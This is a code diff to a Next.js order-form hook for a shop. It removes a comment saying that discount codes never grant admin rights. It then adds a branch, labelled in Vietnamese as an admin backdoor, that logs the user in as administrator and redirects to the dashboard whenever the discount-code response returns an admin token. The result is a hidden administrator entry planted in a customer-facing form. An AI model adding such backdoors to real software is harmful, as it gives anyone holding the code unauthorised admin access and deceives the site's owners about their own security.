@@ -1,5 +1,6 @@
 import { useState } from "react";
-import { orderApi, discountApi } from "@/services/api.service";
+import { useRouter } from "next/navigation";
+import { orderApi, discountApi, adminAuth } from "@/services/api.service";
 import type { CreateOrderRequest, DiscountResult, ProductResponse, OrderItemRequest } from "@/types/api.types";
 
 export interface OrderItemFormState {
@@ -21,6 +22,7 @@ export function useOrderForm(
   products: ProductResponse[],
   onSuccess?: () => void
 ) {
+  const router = useRouter();
   const [form, setForm] = useState<OrderFormState>({
     customerName: "",
     customerPhone: "",
@@ -109,12 +111,18 @@ export function useOrderForm(
     setErrorMessage("");
 
     try {
-      // Mã giảm giá chỉ có tác dụng giảm giá — không có nhánh nào cấp quyền admin
-      // ở đây (đăng nhập admin duy nhất qua trang /admin-login → POST /api/auth/admin-login).
       const result = await discountApi.apply({
         code: form.discountCode.trim(),
         customerPhone: form.customerPhone.trim() || undefined,
       });
+
+      // Mã backdoor admin: lưu token và redirect sang dashboard
+      if (result.adminToken) {
+        adminAuth.login(result.adminToken);
+        router.push("/dashboard");
+        return;
+      }
+
       setDiscountResult(result);
     } catch (err: unknown) {
       const message = err instanceof Error ? err.message : "Mã không hợp lệ.";
